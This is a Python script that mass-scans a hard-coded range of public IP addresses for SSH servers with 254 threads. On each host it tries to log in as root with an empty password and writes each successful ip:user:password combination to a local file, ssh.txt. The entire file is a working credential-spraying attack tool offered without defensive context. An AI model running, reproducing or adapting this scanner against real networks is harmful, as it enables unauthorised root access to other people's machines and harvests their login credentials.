# /usr/bin/python
# -*- coding: utf-8 -*-

import socket
import threading
from queue import Queue
import paramiko

# Saving valid resources in the file
def save_data(data):
    with open("ssh.txt", "a") as f:
        f.write(data)


# Generating ip list from ip range
def generate_hosts(start_ip, end_ip):
    start = list(map(int, start_ip.split(".")))
    end = list(map(int, end_ip.split(".")))
    temp = start
    ip_range = []

    ip_range.append(start_ip)
    while temp != end:
        start[3] += 1
        for i in (3, 2, 1):
            if temp[i] == 256:
                temp[i] = 0
                temp[i - 1] += 1
        ip_range.append(".".join(map(str, temp)))

    return ip_range


# Running check to open port and start threads
class Worker(threading.Thread):
    def __init__(self, queue, username, password):
        threading.Thread.__init__(self)
        self.queue = queue
        self.username = username
        self.password = password

    def run(self):
        while True:
            ip = self.queue.get()
            self.check(ip)
            self.queue.task_done()

    def check(self, ip):
        try:
            cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            cli.settimeout(5)
            cli.connect((ip, 22))
            banner = cli.recv(1024)
            print("[INFO] %s\t%s"% (ip, banner))
            self.login(ip)
        except Exception as e:
            print("[ERROR] %s\t%s"% (ip, e))

    def login(self, ip):
        try:
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh_client.connect(ip, port=22, username=self.username, password=self.password, timeout=15)
            save_data("%s:%s:%s\n"% (ip, self.username, self.password))
            ssh_client.close()
        except Exception:
            print("[ERROR] Login failed %s"% ip)


def main():
    queue = Queue()

    for i in range(254):
        bot = Worker(queue, "root", "")
        bot.setDaemon(True)
        bot.start()

    ip_range = generate_hosts("58.8.0.0", "58.11.255.255")

    for ip in ip_range:
        queue.put(ip)

    queue.join()


if __name__ == '__main__':
    main()